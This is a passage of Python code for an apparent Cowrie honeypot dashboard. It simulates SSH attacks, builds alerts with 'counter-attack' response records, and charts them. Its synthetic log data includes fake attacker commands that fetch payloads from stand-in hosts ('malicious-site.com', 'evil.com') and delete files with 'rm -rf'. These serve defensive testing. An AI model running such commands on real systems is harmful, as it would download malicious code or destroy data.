        parent = os.path.dirname(ap)
        try:
            if parent:
                os.makedirs(parent, exist_ok=True)
            return ap
        except OSError:
            continue
    return os.path.abspath("./cowrie-dashboard-data.json")


def _synthetic_cowrie_log_for_simulate(attack_type: str) -> Dict[str, Any]:
    """Build one Cowrie JSON log line shaped dict for the given simulate attack type."""
    ts = datetime.now().isoformat()
    random_ip = f"198.51.100.{random.randint(1, 254)}"
    sid = f"session-{random.randint(1000, 9999)}"
    if attack_type == "SUCCESSFUL_INTRUSION":
        return {
            "eventid": "cowrie.login.success",
            "timestamp": ts,
            "src_ip": random_ip,
            "username": "root",
            "password": "password123",
            "session": sid,
            "protocol": "ssh",
        }
    if attack_type == "MALICIOUS_COMMAND":
        commands = [
            "wget http://malicious-site.com/backdoor.sh",
            "curl -O http://evil.com/payload.py",
            "rm -rf /tmp/*",
            'python -c "import os; os.system(\\"whoami\\")"',
        ]
        return {
            "eventid": "cowrie.command.input",
            "timestamp": ts,
            "src_ip": random_ip,
            "input": random.choice(commands),
            "session": sid,
        }
    if attack_type == "SUSPICIOUS_FILE_DOWNLOAD":
        files = ["malware.sh", "backdoor.py", "trojan.exe", "keylogger.bin"]
        return {
            "eventid": "cowrie.session.file_download",
            "timestamp": ts,
            "src_ip": random_ip,
            "filename": random.choice(files),
            "session": sid,
        }
    if attack_type == "BRUTE_FORCE_ATTEMPT":
        return {
            "eventid": "cowrie.login.failed",
            "timestamp": ts,
            "src_ip": random_ip,
            "username": random.choice(["root", "admin", "test", "user"]),
            "password": random.choice(["123456", "password", "admin", "root"]),
            "session": sid,
        }
    return {
        "eventid": "cowrie.login.failed",
        "timestamp": ts,
        "src_ip": random_ip,
        "username": "unknown",
        "password": "unknown",
        "session": sid,
    }


def simulate_single_attack(attack_type: str):
    """
    Simulate a single attack and append one alert to the dashboard JSON.

    Uses :func:`cowrie_log_processor.analyze_cowrie_log_for_dashboard` so the UI matches the live
    pipeline (Cloudera ReAct vs workflow per ``COWRIE_COUNTER_ATTACK_ENGINE``). Falls back to
    ``create_alert_directly`` if Flink Agents / imports are unavailable or the pipeline returns no alert.
    """
    dashboard_file = _resolve_cowrie_dashboard_json_path()
    log_entry = _synthetic_cowrie_log_for_simulate(attack_type)

    alert = None
    try:
        from cowrie_log_processor import analyze_cowrie_log_for_dashboard

        alert = analyze_cowrie_log_for_dashboard(log_entry)
    except Exception:
        alert = None

    if alert is None:
        return create_alert_directly(attack_type)

    try:
        alerts: list = []
        if os.path.exists(dashboard_file):
            with open(dashboard_file, "r", encoding="utf-8") as f:
                raw = f.read().strip()
                alerts = json.loads(raw) if raw else []
        if not isinstance(alerts, list):
            alerts = []
        alerts.append(alert)
        with open(dashboard_file, "w", encoding="utf-8") as f:
            json.dump(alerts, f, indent=2)
        load_dashboard_data.clear()
        return True
    except Exception:
        return create_alert_directly(attack_type)


def _simulate_and_report(attack_type: str) -> None:
    """Simulate one attack and show whether ReAct or workflow handled it."""
    if REACT_UI_TEST_AVAILABLE:
        result = run_pipeline_test(
            engine=os.environ.get("COWRIE_COUNTER_ATTACK_ENGINE", "auto"),
            attack_type=attack_type,
            append_to_dashboard=True,
        )
        st.session_state["last_simulate_result"] = result
        load_dashboard_data.clear()
        if result.get("is_react"):
            st.success(
                f"⭐ ReAct agent used — {result.get('threat_type')} "
                f"({result.get('elapsed_ms')} ms)"
            )
        elif result.get("ok"):
            st.warning(
                f"Workflow only (no ⭐) — {result.get('threat_type')}. "
                "Open **ReAct Agent Lab** to test ReAct explicitly."
            )
        else:
            st.error(result.get("error") or "Simulate failed")
        return
    if simulate_single_attack(attack_type):
        st.success("Attack simulated (legacy path — engine not verified)")
    else:
        st.error("Simulate failed")


def create_alert_directly(attack_type: str):
    """Create alert directly without Flink Agents (fallback for simulate buttons)."""
    try:
        import hashlib
        
        dashboard_file = _resolve_cowrie_dashboard_json_path()
        
        # Load existing alerts
        alerts = []
        if os.path.exists(dashboard_file):
            with open(dashboard_file, 'r') as f:
                alerts = json.load(f)
        
        # Generate random IP
        random_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
        timestamp = datetime.now().isoformat()
        
        # Create basic alert structure
        if attack_type == "SUCCESSFUL_INTRUSION":
            session_id = f"session-{random.randint(1000, 9999)}"
            response_actions = [
                {
                    "action_id": f"cowrie-block-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "BLOCK_IP_COWRIE",
                    "target": random_ip,
                    "severity": "CRITICAL",
                    "reason": f"Blocked in Cowrie honeypot: Successful intrusion attempt",
                    "status": "blocked",
                    "details": {"status": "blocked", "ip": random_ip}
                },
                {
                    "action_id": f"block-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "BLOCK_IP",
                    "target": random_ip,
                    "severity": "CRITICAL",
                    "reason": f"Successful login from {random_ip}",
                    "status": "success",
                    "details": {"status": "success", "ip": random_ip}
                },
                {
                    "action_id": f"alert-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "SEND_ALERT",
                    "target": "security-alerts",
                    "severity": "CRITICAL",
                    "reason": f"🚨 CRITICAL: Successful intrusion from {random_ip}",
                    "status": "sent",
                    "details": {
                        "status": "sent",
                        "channel": "security-alerts",
                        "message_id": f"msg-{hash(timestamp) % 1000000}",
                        "message": f"🚨 CRITICAL: Successful intrusion from {random_ip}",
                        "alert_type": "Slack"
                    }
                },
                # COUNTER-ATTACK: Gather Intelligence
                {
                    "action_id": f"gather-intel-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "GATHER_INTELLIGENCE",
                    "target": random_ip,
                    "severity": "CRITICAL",
                    "reason": "Collecting OSINT on attacker",
                    "status": "gathered",
                    "details": {
                        "reputation_score": -75,
                        "abuse_reports": 23,
                        "country": "Unknown",
                        "threat_types": ["brute_force", "malware", "intrusion"]
                    }
                },
                # COUNTER-ATTACK: Track Behavior
                {
                    "action_id": f"track-{session_id}",
                    "timestamp": timestamp,
                    "action_type": "TRACK_BEHAVIOR",
                    "target": session_id,
                    "severity": "CRITICAL",
                    "reason": "Enhanced forensic tracking",
                    "status": "tracking",
                    "details": {
                        "tracking_level": "comprehensive",
                        "data_collected": ["commands", "network_traffic", "file_operations"]
                    }
                },
                # COUNTER-ATTACK: Deploy Tarpit
                {
                    "action_id": f"tarpit-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "DEPLOY_TARPIT",
                    "target": random_ip,
                    "severity": "CRITICAL",
                    "reason": "Slow down attacker connections",
                    "status": "deployed",
                    "details": {
                        "duration_minutes": 1440,
                        "tarpit_id": f"tarpit-{random_ip}"
                    }
                },
                # COUNTER-ATTACK: Share with Community
                {
                    "action_id": f"share-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "SHARE_THREAT_INTEL",
                    "target": random_ip,
                    "severity": "CRITICAL",
                    "reason": "Protect community from this attacker",
                    "status": "shared",
                    "details": {
                        "platforms": ["MISP", "OpenCTI", "abuse.ch", "AlienVault OTX"],
                        "indicators_shared": 2
                    }
                },
                # COUNTER-ATTACK: Report to Authorities (CRITICAL only)
                {
                    "action_id": f"report-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "REPORT_TO_AUTHORITIES",
                    "target": random_ip,
                    "severity": "CRITICAL",
                    "reason": "Report serious attack to law enforcement",
                    "status": "reported",
                    "details": {
                        "reports_sent": ["ISP abuse contact", "National CERT", "Law enforcement (FBI IC3)"],
                        "report_id": f"REPORT-{hash(timestamp) % 1000000}"
                    }
                },
                # COUNTER-ATTACK: Feed Disinformation
                {
                    "action_id": f"disinfo-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "FEED_DISINFORMATION",
                    "target": session_id,
                    "severity": "CRITICAL",
                    "reason": "Mislead attacker with fake data",
                    "status": "fed",
                    "details": {
                        "disinformation_type": "fake_filesystem",
                        "fake_files": ["fake_secret.txt", "fake_config.conf"]
                    }
                }
            ]
            
            alert = {
                "alert_id": f"ALERT-{timestamp}-{hash(random_ip) % 10000}",
                "timestamp": timestamp,
                "severity": "CRITICAL",
                "threat_type": "SUCCESSFUL_INTRUSION",
                "source_ip": random_ip,
                "description": f"Successful login from {random_ip} to honeypot",
                "recommended_action": "Immediate response required",
                "response_actions": response_actions,
                "attack_details": {
                    "eventid": "cowrie.login.success",
                    "username": "root",
                    "session": session_id
                }
            }
        elif attack_type == "MALICIOUS_COMMAND":
            commands = ["wget http://malicious-site.com/backdoor.sh", "rm -rf /tmp/*"]
            command = random.choice(commands)
            session_id = f"session-{random.randint(1000, 9999)}"
            response_actions = [
                {
                    "action_id": f"cowrie-block-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "BLOCK_IP_COWRIE",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": f"Malicious command: {command[:50]}",
                    "status": "blocked",
                    "details": {"status": "blocked", "ip": random_ip}
                },
                {
                    "action_id": f"block-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "BLOCK_IP",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": f"Malicious command: {command[:50]}",
                    "status": "success",
                    "details": {"status": "success", "ip": random_ip}
                },
                {
                    "action_id": f"alert-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "SEND_ALERT",
                    "target": "security-alerts",
                    "severity": "HIGH",
                    "reason": f"⚠️ HIGH: Malicious command from {random_ip}\nCommand: `{command}`",
                    "status": "sent",
                    "details": {
                        "status": "sent",
                        "channel": "security-alerts",
                        "message_id": f"msg-{hash(timestamp) % 1000000}",
                        "message": f"⚠️ HIGH: Malicious command from {random_ip}\nCommand: `{command}`",
                        "alert_type": "Slack"
                    }
                },
                # COUNTER-ATTACK: Gather Intelligence
                {
                    "action_id": f"gather-intel-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "GATHER_INTELLIGENCE",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": "Collect OSINT on attacker",
                    "status": "gathered",
                    "details": {
                        "reputation_score": -60,
                        "abuse_reports": 15,
                        "country": "Unknown",
                        "threat_types": ["malware", "command_execution"]
                    }
                },
                # COUNTER-ATTACK: Deploy Tarpit
                {
                    "action_id": f"tarpit-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "DEPLOY_TARPIT",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": "Slow down attacker",
                    "status": "deployed",
                    "details": {
                        "duration_minutes": 120,
                        "tarpit_id": f"tarpit-{random_ip}"
                    }
                },
                # COUNTER-ATTACK: Share with Community
                {
                    "action_id": f"share-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "SHARE_THREAT_INTEL",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": "Protect community from this attacker",
                    "status": "shared",
                    "details": {
                        "platforms": ["MISP", "OpenCTI", "abuse.ch"],
                        "indicators_shared": 1
                    }
                }
            ]
            
            alert = {
                "alert_id": f"ALERT-{timestamp}-{hash(random_ip) % 10000}",
                "timestamp": timestamp,
                "severity": "HIGH",
                "threat_type": "MALICIOUS_COMMAND",
                "source_ip": random_ip,
                "description": f"Malicious command detected: {command[:50]}",
                "recommended_action": "Block IP and investigate",
                "response_actions": response_actions,
                "attack_details": {
                    "eventid": "cowrie.command.input",
                    "command": command,
                    "session": session_id
                }
            }
        elif attack_type == "SUSPICIOUS_FILE_DOWNLOAD":
            files = ["malware.sh", "backdoor.py"]
            filename = random.choice(files)
            session_id = f"session-{random.randint(1000, 9999)}"
            response_actions = [
                {
                    "action_id": f"cowrie-block-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "BLOCK_IP_COWRIE",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": f"Suspicious file download: {filename}",
                    "status": "blocked",
                    "details": {"status": "blocked", "ip": random_ip}
                },
                {
                    "action_id": f"block-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "BLOCK_IP",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": f"Suspicious file download: {filename}",
                    "status": "success",
                    "details": {"status": "success", "ip": random_ip}
                },
                {
                    "action_id": f"alert-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "SEND_ALERT",
                    "target": "security-alerts",
                    "severity": "HIGH",
                    "reason": f"⚠️ HIGH: Suspicious file download from {random_ip}\nFile: `{filename}`",
                    "status": "sent",
                    "details": {
                        "status": "sent",
                        "channel": "security-alerts",
                        "message_id": f"msg-{hash(timestamp) % 1000000}",
                        "message": f"⚠️ HIGH: Suspicious file download from {random_ip}\nFile: `{filename}`",
                        "alert_type": "Slack"
                    }
                },
                # COUNTER-ATTACK: Gather Intelligence
                {
                    "action_id": f"gather-intel-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "GATHER_INTELLIGENCE",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": "Collect OSINT on attacker",
                    "status": "gathered",
                    "details": {
                        "reputation_score": -65,
                        "abuse_reports": 18,
                        "country": "Unknown",
                        "threat_types": ["malware", "file_download"]
                    }
                },
                # COUNTER-ATTACK: Deploy Tarpit
                {
                    "action_id": f"tarpit-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "DEPLOY_TARPIT",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": "Slow down attacker",
                    "status": "deployed",
                    "details": {
                        "duration_minutes": 240,
                        "tarpit_id": f"tarpit-{random_ip}"
                    }
                },
                # COUNTER-ATTACK: Share with Community
                {
                    "action_id": f"share-{random_ip}",
                    "timestamp": timestamp,
                    "action_type": "SHARE_THREAT_INTEL",
                    "target": random_ip,
                    "severity": "HIGH",
                    "reason": "Protect community from this attacker",
                    "status": "shared",
                    "details": {
                        "platforms": ["MISP", "OpenCTI", "abuse.ch"],
                        "indicators_shared": 1
                    }
                }
            ]
            
            alert = {
                "alert_id": f"ALERT-{timestamp}-{hash(random_ip) % 10000}",
                "timestamp": timestamp,
                "severity": "HIGH",
                "threat_type": "SUSPICIOUS_FILE_DOWNLOAD",
                "source_ip": random_ip,
                "description": f"Suspicious file downloaded: {filename}",
                "recommended_action": "Block IP and analyze file",
                "response_actions": response_actions,
                "attack_details": {
                    "eventid": "cowrie.session.file_download",
                    "filename": filename,
                    "session": session_id
                }
            }
        elif attack_type == "BRUTE_FORCE_ATTEMPT":
            alert = {
                "alert_id": f"ALERT-{timestamp}-{hash(random_ip) % 10000}",
                "timestamp": timestamp,
                "severity": "MEDIUM",
                "threat_type": "BRUTE_FORCE_ATTEMPT",
                "source_ip": random_ip,
                "description": f"Brute force attempt from {random_ip}",
                "recommended_action": "Block IP if threshold exceeded",
                "response_actions": [
                    {
                        "action_id": f"block-{random_ip}",
                        "timestamp": timestamp,
                        "action_type": "BLOCK_IP",
                        "target": random_ip,
                        "severity": "MEDIUM",
                        "reason": "Brute force attack pattern",
                        "status": "success",
                        "details": {"status": "success", "ip": random_ip}
                    },
                    {
                        "action_id": f"alert-{random_ip}",
                        "timestamp": timestamp,
                        "action_type": "SEND_ALERT",
                        "target": "security-alerts",
                        "severity": "MEDIUM",
                        "reason": f"🟡 MEDIUM: Brute force attempt from {random_ip}",
                        "status": "sent",
                        "details": {
                            "status": "sent",
                            "channel": "security-alerts",
                            "message_id": f"msg-{hash(timestamp) % 1000000}",
                            "message": f"🟡 MEDIUM: Brute force attempt from {random_ip}",
                            "alert_type": "Slack"
                        }
                    }
                ],
                "attack_details": {
                    "eventid": "cowrie.login.failed",
                    "username": "admin",
                    "password": "password"
                }
            }
        else:
            return False
        
        # Save alert
        alerts.append(alert)
        os.makedirs(os.path.dirname(dashboard_file) if os.path.dirname(dashboard_file) else '.', exist_ok=True)
        with open(dashboard_file, 'w') as f:
            json.dump(alerts, f, indent=2)
        
        # Clear cache
        load_dashboard_data.clear()
        return True
        
    except Exception as e:
        return False


def extract_counter_attack_actions(alerts_data):
    """Extract counter-attack actions from alerts data."""
    counter_attack_types = [
        "GATHER_INTELLIGENCE",
        "DEPLOY_TARPIT",
        "TRACK_BEHAVIOR",
        "SHARE_THREAT_INTEL",
        "REPORT_TO_AUTHORITIES",
        "FEED_DISINFORMATION"
    ]
    
    counter_attacks = []
    for alert in alerts_data:
        for action in alert.get("response_actions", []):
            action_type = action.get("action_type", "")
            if action_type in counter_attack_types:
                ts = _parse_alert_timestamp(
                    action.get("timestamp") or alert.get("timestamp")
                )
                counter_attacks.append({
                    "alert_id": alert.get("alert_id", "N/A"),
                    "timestamp": ts.isoformat() if ts else "N/A",
                    "source_ip": alert.get("source_ip", "N/A"),
                    "severity": alert.get("severity", "UNKNOWN"),
                    "threat_type": alert.get("threat_type", "UNKNOWN"),
                    "react_agent": is_react_agent_alert(alert),
                    "action_type": action_type,
                    "action_id": action.get("action_id", "N/A"),
                    "target": action.get("target", "N/A"),
                    "status": action.get("status", "UNKNOWN"),
                    "reason": action.get("reason", "N/A"),
                    "details": action.get("details", {})
                })
    
    return counter_attacks


def extract_geographic_data(alerts_data):
    """Extract geographic data from alerts (whois or lab demo geography)."""
    geo_data = {}

    for alert in alerts_data:
        source_ip = alert_source_ip(alert)
        if not source_ip:
            continue

        whois_data = lookup_whois_cached(source_ip) or demo_geo_for_ip(source_ip)
        country = whois_data.get("country") or "Unknown"
        if country in ("N/A", ""):
            country = "Unknown"

        lat = whois_data.get("lat")
        lon = whois_data.get("lon")
        if lat is None or lon is None:
            lat, lon = country_coords(country)

        if country not in geo_data:
            geo_data[country] = {
                "country": country,
                "attack_count": 0,
                "ips": set(),
                "severities": {},
                "threat_types": {},
                "alerts": [],
                "lat": lat,
                "lon": lon,
                "demo": whois_data.get("type") == "demo",
            }

        geo_data[country]["attack_count"] += 1
        geo_data[country]["ips"].add(source_ip)

        severity = alert.get("severity", "UNKNOWN")
        geo_data[country]["severities"][severity] = (
            geo_data[country]["severities"].get(severity, 0) + 1
        )

        threat_type = alert.get("threat_type", "UNKNOWN")
        geo_data[country]["threat_types"][threat_type] = (
            geo_data[country]["threat_types"].get(threat_type, 0) + 1
        )

        geo_data[country]["alerts"].append(
            {
                "alert_id": alert.get("alert_id", "N/A"),
                "ip": source_ip,
                "timestamp": alert.get("timestamp", ""),
                "severity": severity,
                "threat_type": threat_type,
                "whois": whois_data,
            }
        )

    result = []
    for country, data in geo_data.items():
        result.append(
            {
                "country": country,
                "attack_count": data["attack_count"],
                "unique_ips": len(data["ips"]),
                "ips": list(data["ips"])[:10],
                "severities": data["severities"],
                "threat_types": data["threat_types"],
                "alerts": data["alerts"][:20],
                "lat": data["lat"],
                "lon": data["lon"],
                "demo": data["demo"],
            }
        )

    return sorted(result, key=lambda x: x["attack_count"], reverse=True)


def detect_attack_patterns(alerts_data):
    """Detect attack patterns in alerts data."""
    patterns = {
        "repeated_ips": {},
        "similar_commands": {},
        "coordinated_attacks": [],
        "time_patterns": {}
    }
    
    # Track IPs and their attack sequences
    ip_sequences = {}
    
    for alert in alerts_data:
        source_ip = alert.get("source_ip", "")
        timestamp = alert.get("timestamp", "")
        threat_type = alert.get("threat_type", "")
        
        if not source_ip:
            continue
        
        # Track repeated IPs
        if source_ip not in patterns["repeated_ips"]:
            patterns["repeated_ips"][source_ip] = {
                "count": 0,
                "first_seen": timestamp,
                "last_seen": timestamp,
                "threat_types": set(),
                "alerts": []
            }
        
        patterns["repeated_ips"][source_ip]["count"] += 1
        patterns["repeated_ips"][source_ip]["threat_types"].add(threat_type)
        patterns["repeated_ips"][source_ip]["alerts"].append(alert.get("alert_id", ""))
        
        if timestamp < patterns["repeated_ips"][source_ip]["first_seen"]:
            patterns["repeated_ips"][source_ip]["first_seen"] = timestamp
        if timestamp > patterns["repeated_ips"][source_ip]["last_seen"]:
            patterns["repeated_ips"][source_ip]["last_seen"] = timestamp
        
        # Track commands
        attack_details = alert.get("attack_details", {})
        command = attack_details.get("command", "")
        if command:
            cmd_hash = hash(command.lower().strip())
            if cmd_hash not in patterns["similar_commands"]:
                patterns["similar_commands"][cmd_hash] = {
                    "command": command,
                    "count": 0,
                    "ips": set(),
                    "alerts": []
                }
            patterns["similar_commands"][cmd_hash]["count"] += 1
            patterns["similar_commands"][cmd_hash]["ips"].add(source_ip)
            patterns["similar_commands"][cmd_hash]["alerts"].append(alert.get("alert_id", ""))
        
        # Track time patterns
        try:
            dt = _parse_alert_timestamp(timestamp)
            if dt is None:
                raise ValueError("invalid timestamp")
            hour = dt.hour
            day_of_week = dt.strftime('%A')
            
            if hour not in patterns["time_patterns"]:
                patterns["time_patterns"][hour] = 0
            patterns["time_patterns"][hour] += 1
        except:
            pass
        
        # Track IP sequences for coordinated attacks
        if source_ip not in ip_sequences:
            ip_sequences[source_ip] = []
        ip_sequences[source_ip].append({
            "timestamp": timestamp,
            "threat_type": threat_type,
            "alert_id": alert.get("alert_id", "")
        })
    
    # Detect coordinated attacks (multiple IPs attacking within short time window)
    # Group alerts by time windows
    time_windows = {}
    for alert in alerts_data:
        timestamp = alert.get("timestamp", "")
        source_ip = alert.get("source_ip", "")
        if not timestamp or not source_ip:
            continue
        
        try:
            dt = _parse_alert_timestamp(timestamp)
            if dt is None:
                continue
            # Group by 5-minute windows
            window_key = dt.strftime('%Y-%m-%d %H:%M')[:16]  # Round to nearest 5 minutes
            if window_key not in time_windows:
                time_windows[window_key] = []
            time_windows[window_key].append({
                "ip": source_ip,
                "alert_id": alert.get("alert_id", ""),
                "timestamp": timestamp
            })
        except:
            pass
    
    # Find windows with multiple unique IPs (potential coordinated attack)
    for window, attacks in time_windows.items():
        unique_ips = set(a["ip"] for a in attacks)
        if len(unique_ips) >= 3:  # 3+ different IPs in same time window
            patterns["coordinated_attacks"].append({
                "window": window,
                "unique_ips": len(unique_ips),
                "total_attacks": len(attacks),
                "ips": list(unique_ips),
                "attacks": attacks
            })
    
    # Convert sets to lists for JSON serialization
    for ip, data in patterns["repeated_ips"].items():
        patterns["repeated_ips"][ip]["threat_types"] = list(data["threat_types"])
    
    for cmd_hash, data in patterns["similar_commands"].items():
        patterns["similar_commands"][cmd_hash]["ips"] = list(data["ips"])
    
    return patterns


def get_threat_intelligence_score(ip: str, whois_data: Optional[Dict] = None) -> Dict[str, Any]:
    """Get threat intelligence score for an IP (simulated or real API)."""
    # In production, this would call AbuseIPDB, VirusTotal, etc.
    # For now, simulate based on whois data and attack history
    
    score = {
        "reputation_score": 0,  # -100 to 100
        "abuse_reports": 0,
        "threat_level": "UNKNOWN",
        "sources": [],
        "last_updated": datetime.now().isoformat()
    }
    
    # Simulate reputation based on whois data
    if whois_data:
        if whois_data.get("type") == "private":
            score["threat_level"] = "LOW"
            score["reputation_score"] = 50
        elif whois_data.get("error"):
            score["threat_level"] = "UNKNOWN"
            score["reputation_score"] = 0
        else:
            # Simulate based on country (some countries have higher threat rates)
            country = whois_data.get("country", "").upper()
            high_risk_countries = ["CN", "RU", "KP", "IR"]
            if country in high_risk_countries:
                score["reputation_score"] = -50
                score["abuse_reports"] = random.randint(10, 50)
                score["threat_level"] = "HIGH"
                score["sources"] = ["AbuseIPDB", "VirusTotal"]
            else:
                score["reputation_score"] = random.randint(-20, 20)
                score["abuse_reports"] = random.randint(0, 10)
                score["threat_level"] = "MEDIUM" if score["reputation_score"] < 0 else "LOW"
                score["sources"] = ["AbuseIPDB"]
    
    return score


def render_counter_attack_dashboard(alerts_data):
    """Render the counter-attack dashboard page."""
    st.markdown(
        '<div class="main-header">Counter-Attack Dashboard</div>'
        '<p style="color:#5c5278;margin:-0.5rem 0 1rem;">Flink Agents · response actions and outcomes</p>',
        unsafe_allow_html=True,
    )
    
    # Load data
    if not alerts_data:
        st.warning("No threat detection data available. Run the demo first to generate data.")
        st.info("Run: `python demo_cowrie_response.py` to generate threat detection results.")
        return
    
    # Extract counter-attack actions
    counter_attacks = extract_counter_attack_actions(alerts_data)
    
    if not counter_attacks:
        st.info(
            "No counter-attack actions in stored alerts yet. Use **Simulate Attacks** in the sidebar "
            "(same Cloudera ReAct / workflow logic as the log processor when Flink Agents are available), "
            "or ingest live Cowrie logs."
        )
        st.markdown("""
        **Counter-Attack Actions Include:**
        - 🔍 Intelligence Gathering (OSINT)
        - 🕳️ Tarpit Deployment
        - 📹 Behavior Tracking
        - 🤝 Threat Sharing
        - 📞 Authority Reporting
        - 🎭 Disinformation Feeding (including Cloudera LLM honeypot payloads when ReAct is enabled)
        """)
        return
    
    with st.sidebar.expander("Capabilities", expanded=False):
        st.caption("Intel · tarpit · track · share · report · disinfo")
        st.caption("Guide: COUNTER_ATTACK_GUIDE.md")

    st.sidebar.markdown("---")
    auto_refresh = st.sidebar.checkbox(
        "Auto-refresh", value=False, key="counter_attack_auto_refresh"
    )
    refresh_interval = st.sidebar.selectbox(
        "Interval (s)",
        options=[5, 10, 15, 30, 60],
        index=0,
        key="counter_attack_refresh_interval",
    )
    if auto_refresh:
        import time

        time.sleep(refresh_interval)
        st.rerun()
    if st.sidebar.button("Reload", use_container_width=True, key="counter_attack_manual_refresh"):
        load_dashboard_data.clear()
        st.rerun()
    # Statistics
    st.subheader("Overview")
    col1, col2, col3, col4, col5 = st.columns(5)

    total_counter_attacks = len(counter_attacks)
    unique_ips = len(set(ca["source_ip"] for ca in counter_attacks))
    react_counter_attacks = sum(1 for ca in counter_attacks if ca.get("react_agent"))
    successful_attacks = sum(
        1
        for ca in counter_attacks
        if ca["status"]
        in ["success", "gathered", "deployed", "tracking", "shared", "reported", "fed"]
    )
    critical_counter_attacks = sum(1 for ca in counter_attacks if ca["severity"] == "CRITICAL")

    col1.metric("Total", total_counter_attacks)
    col2.metric("Attackers", unique_ips)
    col3.metric("ReAct", react_counter_attacks)
    col4.metric("Succeeded", successful_attacks)
    col5.metric("Critical", critical_counter_attacks)
    
    # Counter-Attack Type Distribution
    st.header("📈 Counter-Attack Breakdown")
    
    col1, col2 = st.columns(2)
    
    with col1:
        # Counter-attack types
        attack_type_counts = {}
        for ca in counter_attacks:
            attack_type = ca["action_type"]
            attack_type_counts[attack_type] = attack_type_counts.get(attack_type, 0) + 1
        
        if attack_type_counts:
            fig_types = px.bar(
                x=list(attack_type_counts.keys()),
                y=list(attack_type_counts.values()),
                title="Counter-Attacks by Type",
                labels={"x": "Counter-Attack Type", "y": "Count"},
                color=list(attack_type_counts.values()),
                color_continuous_scale=["#f4f1fa", "#ffb38a", "#ff550d", "#120046"]
            )
            fig_types.update_layout(showlegend=False)
            st.plotly_chart(fig_types, use_container_width=True)
    
    with col2:
        # Counter-attack status
        status_counts = {}
        for ca in counter_attacks:
            status = ca["status"]
            status_counts[status] = status_counts.get(status, 0) + 1
        
        if status_counts:
            fig_status = px.pie(
                values=list(status_counts.values()),
                names=list(status_counts.keys()),
                title="Counter-Attack Status Distribution"
            )
            st.plotly_chart(fig_status, use_container_width=True)
    
    with st.expander("⏱️ Counter-attack timeline", expanded=False):
        timeline_data = []
        for ca in counter_attacks:
            timestamp = _parse_alert_timestamp(ca.get("timestamp"))
            if timestamp is None:
                continue
            timeline_data.append({
                "Timestamp": timestamp,
                "Counter-Attack Type": ca["action_type"],
                "Source IP": ca["source_ip"],
                "Severity": ca["severity"]
            })
        if timeline_data:
            timeline_df = _coerce_timeline_dataframe(pd.DataFrame(timeline_data))
            fig_timeline = px.scatter(
                timeline_df,
                x="Timestamp",
                y="Counter-Attack Type",
                color="Severity",
                size=[10] * len(timeline_df),
                title="Counter-Attack Actions Over Time",
                color_discrete_map=SEVERITY_COLOR_MAP
            )
            st.plotly_chart(fig_timeline, use_container_width=True)
        else:
            st.caption("No timestamps available for timeline.")
    
    # Detailed Counter-Attack Actions
    with st.expander(f"Counter-attack actions detail ({len(counter_attacks)})", expanded=False):
    
        # Group by action type
        action_type_groups = {}
        for ca in counter_attacks:
            action_type = ca["action_type"]
            if action_type not in action_type_groups:
                action_type_groups[action_type] = []
            action_type_groups[action_type].append(ca)
    
        # Action type descriptions
        action_descriptions = {
            "GATHER_INTELLIGENCE": "🔍 Gathers OSINT on attacker (IP reputation, geolocation, threat intel)",
            "DEPLOY_TARPIT": "🕳️ Deploys tarpit to slow down attacker connections",
            "TRACK_BEHAVIOR": "📹 Tracks attacker behavior in detail (commands, network, files)",
            "SHARE_THREAT_INTEL": "🤝 Shares threat indicators with community (MISP, OpenCTI, abuse.ch)",
            "REPORT_TO_AUTHORITIES": "📞 Reports attacker to authorities (ISP, CERT, law enforcement)",
            "FEED_DISINFORMATION": "🎭 Feeds fake information to mislead attacker"
        }
    
        for action_type, actions in sorted(action_type_groups.items()):
            desc = action_descriptions.get(action_type, f"Counter-attack: {action_type}")
        
            with st.expander(f"{desc} ({len(actions)} actions)", expanded=False):
                for i, ca in enumerate(actions, 1):
                    status_emoji = "✅" if ca["status"] in ["success", "gathered", "deployed", "tracking", "shared", "reported", "fed"] else "⏳"
                
                    col1, col2 = st.columns([3, 1])
                    with col1:
                        react_label = " ⭐" if ca.get("react_agent") else ""
                        st.markdown(f"**{i}. {status_emoji} {action_type}{react_label}**")
                        st.markdown(f"   **Target:** `{ca['target']}`")
                        st.markdown(f"   **Source IP:** `{ca['source_ip']}`")
                        st.markdown(f"   **Severity:** {ca['severity']}")
                        st.markdown(f"   **Reason:** {ca['reason']}")
                        st.markdown(f"   **Time:** {ca['timestamp']}")
                
                    with col2:
                        st.markdown(f"**Status:** {ca['status']}")
                        details = ca.get("details") or {}
                        if ca["action_type"] == "FEED_DISINFORMATION" and isinstance(details, dict):
                            if details.get("cloudera_llm_disinformation") or details.get("llm_generated"):
                                st.markdown("**LLM decoy:** ✅ Cloudera / dynamic honeypot payload")
                            if details.get("disinfo_publish", {}).get("published"):
                                st.caption("Queued to `cowrie.disinfo_requests` for live Cowrie apply")
                        if ca.get('details'):
                            with st.expander("Details"):
                                st.json(ca['details'])
                
                    st.markdown("---")
    

    attacker_counts = {}
    for ca in counter_attacks:
        ip = ca["source_ip"]
        if ip not in attacker_counts:
            attacker_counts[ip] = {
                "count": 0,
                "actions": [],
